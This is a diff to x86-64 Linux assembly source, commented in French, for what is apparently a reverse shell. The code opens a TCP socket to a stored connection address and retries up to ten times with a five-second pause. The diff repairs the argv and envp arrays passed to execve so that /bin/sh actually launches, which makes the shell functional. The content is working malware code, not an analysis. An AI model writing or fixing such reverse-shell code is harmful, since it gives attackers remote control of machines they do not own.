@@ -15,7 +15,6 @@ section .data
     SYS_EXIT equ 60
     SYS_CLOSE equ 3
     SYS_NANOSLEEP equ 35
-
     ; Constantes pour socket
     AF_INET equ 2
     SOCK_STREAM equ 1
@@ -27,19 +26,20 @@ section .data
 
     ; Constantes pour retry
     MAX_RETRY equ 10       ; Nombre max de tentatives
-
     ; Structure timespec pour nanosleep
     timespec:
         tv_sec  dq 5       ; 5 sec
         tv_nsec dq 0
-    
     ; path pour shell
     shell db "/bin/sh", 0
-    args db 0
-    env db 0
+    shell_argv:
+        .argv0 dq shell
+        .argv1 dq 0
+    shell_envp:
+        .envp0 dq 0
 
 section .bss
-    sockfd resq 1    
+    sockfd resq 1
     sockaddr_in resb 16 ; Struct pour stocker l'IP de connexion
     retry_count resq 1     ; Compteur de tentatives de connexion
 
@@ -97,9 +97,9 @@ try_connect:
 
     ; exec du shell
     mov rax, SYS_EXECVE
-    lea rdi, [shell]       ; chemin vers /bin/sh
-    lea rsi, [args]        ; arguments (aucun)
-    lea rdx, [env]         ; variables d'environnement (aucune)
+    lea rdi, [shell]               ; chemin vers /bin/sh
+    lea rsi, [shell_argv]          ; tableau d'arguments
+    lea rdx, [shell_envp]          ; tableau de variables d'environnement
     syscall
 
     ; Error handling, si connexion à échouée 
@@ -118,7 +118,7 @@ connect_error:
     mov rdi, [sockfd]
     syscall
     inc qword [retry_count]
-    
+
 retry_logic:
     mov rax, [retry_count]
     cmp rax, MAX_RETRY
